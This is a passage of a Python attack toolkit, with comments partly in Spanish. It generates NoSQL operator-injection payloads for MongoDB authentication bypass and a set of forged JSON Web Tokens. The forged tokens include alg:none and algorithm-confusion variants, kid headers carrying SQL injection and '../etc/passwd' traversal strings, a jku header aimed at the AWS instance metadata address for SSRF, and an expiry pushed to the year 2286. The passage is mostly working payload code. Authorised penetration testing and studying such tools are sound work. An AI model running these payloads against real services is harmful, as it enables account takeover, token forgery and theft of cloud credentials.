      5. $where JavaScript injection (pre-4.4 MongoDB)
      6. $in array bypass
      7. Array-based operator injection (field[$ne]=x)
    """
    out = []

    def _add(tech: str, j: str, qs: str) -> None:
        out.append({"technique": tech, "payload_json": j, "payload_qs": qs})

    _add("ne_null",
         f'{{"{field}": {{"$ne": null}}}}',
         f"{field}[$ne]=null")

    _add("ne_empty_string",
         f'{{"{field}": {{"$ne": ""}}}}',
         f"{field}[$ne]=")

    _add("gt_empty",
         f'{{"{field}": {{"$gt": ""}}}}',
         f"{field}[$gt]=")

    _add("regex_all",
         f'{{"{field}": {{"$regex": ".*"}}}}',
         f"{field}[$regex]=.*")

    _add("exists_true",
         f'{{"{field}": {{"$exists": true}}}}',
         f"{field}[$exists]=true")

    _add("where_true",
         '{"$where": "1==1"}',
         "$where=1==1")

    _add("in_array",
         f'{{"{field}": {{"$in": ["", null, false, 0]}}}}',
         f"{field}[$in][]=&{field}[$in][]=null")

    _add("not_object",
         f'{{"{field}": {{"$not": {{"$eq": "impossible_value"}}}}}}',
         f"{field}[$not][$eq]=impossible_value")

    return out


# ---------------------------------------------------------------------------
# 9. JWT tampering payloads
# ---------------------------------------------------------------------------

def load_jwt_attack_payloads(token: str, secret_guesses: List[str] = None) -> List[dict]:
    """Genera variantes de JWT manipulado para ataques comunes.

    `token`: JWT original (3 partes separadas por '.')
    `secret_guesses`: lista de secrets a probar para HS256 bruteforce

    Retorna lista de dicts {technique, token, notes}.

    Tecnicas cubiertas:
      1. alg:none — eliminar firma, algorithm=none/NONE/None
      2. HS256→RS256 confusion — cambiar alg a RS256 (si el servidor usa clave publica como secret)
      3. kid injection — inyectar SQL/path en el 'kid' header para leer clave desde disco/DB
      4. jku/x5u SSRF — apuntar a clave controlada por atacante
      5. nbf/exp manipulation — extender expiracion al maximo (exp=9999999999)
      6. Blank secret — firmar con "" (Qwen no tiene crypto; genera estructura solamente)
    """
    import base64 as _b64
    import json as _json

    def _b64_decode_pad(s: str) -> bytes:
        s += "=" * (-len(s) % 4)
        return _b64.urlsafe_b64decode(s)

    def _b64_encode(b: bytes) -> str:
        return _b64.urlsafe_b64encode(b).rstrip(b"=").decode()

    out: List[dict] = []
    parts = (token or "").split(".")
    if len(parts) != 3:
        return []

    try:
        header = _json.loads(_b64_decode_pad(parts[0]))
        payload = _json.loads(_b64_decode_pad(parts[1]))
    except Exception:
        return []

    # 1. alg:none — remove signature
    for none_val in ("none", "None", "NONE", "nOnE"):
        h2 = dict(header)
        h2["alg"] = none_val
        new_hdr = _b64_encode(_json.dumps(h2, separators=(",", ":")).encode())
        new_pay = parts[1]
        # Both with and without trailing dot
        out.append({"technique": f"alg_none_{none_val}",
                    "token": f"{new_hdr}.{new_pay}.",
                    "notes": "signature stripped, alg set to none variant"})
        out.append({"technique": f"alg_none_{none_val}_nosig",
                    "token": f"{new_hdr}.{new_pay}",
                    "notes": "signature stripped entirely"})

    # 2. RS256 confusion: change alg to RS256 (pub key used as HMAC secret)
    h2 = dict(header)
    h2["alg"] = "RS256"
    new_hdr = _b64_encode(_json.dumps(h2, separators=(",", ":")).encode())
    out.append({"technique": "rs256_confusion",
                "token": f"{new_hdr}.{parts[1]}.{parts[2]}",
                "notes": "alg changed to RS256 — may work if server uses pubkey as HMAC secret"})

    # 3. kid injection — SQL: SELECT '' where 1=0--
    for kid_inj in [
        "' UNION SELECT '' --",
        "../../dev/null",
        "/dev/null",
        "' OR '1'='1",
        "../etc/passwd",
    ]:
        h2 = dict(header)
        h2["kid"] = kid_inj
        h2["alg"] = "HS256"
        new_hdr = _b64_encode(_json.dumps(h2, separators=(",", ":")).encode())
        out.append({"technique": f"kid_inject_{kid_inj[:20]}",
                    "token": f"{new_hdr}.{parts[1]}.",
                    "notes": f"kid injection: {kid_inj!r}"})

    # 4. jku SSRF — point to attacker-controlled key
    h2 = dict(header)
    h2["jku"] = "http://169.254.169.254/latest/meta-data/"  # internal SSRF probe
    new_hdr = _b64_encode(_json.dumps(h2, separators=(",", ":")).encode())
    out.append({"technique": "jku_ssrf_imds",
                "token": f"{new_hdr}.{parts[1]}.{parts[2]}",
                "notes": "jku pointing to AWS IMDS — SSRF probe"})

    # 5. exp manipulation — extend expiry to year 2286
    p2 = dict(payload)
    p2["exp"] = 9999999999
    p2["nbf"] = 0
    new_pay = _b64_encode(_json.dumps(p2, separators=(",", ":")).encode())
    out.append({"technique": "exp_max",
                "token": f"{parts[0]}.{new_pay}.{parts[2]}",
                "notes": "exp extended to 9999999999 (year 2286), original signature kept"})

    # 6. Blank secret — common misconfiguration (empty string HMAC)
    h2 = dict(header)
    h2["alg"] = "HS256"
    new_hdr = _b64_encode(_json.dumps(h2, separators=(",", ":")).encode())
    out.append({"technique": "blank_secret_struct",
                "token": f"{new_hdr}.{parts[1]}.",
                "notes": "structure for blank-secret HS256 test — caller must sign with '' HMAC"})

    return out
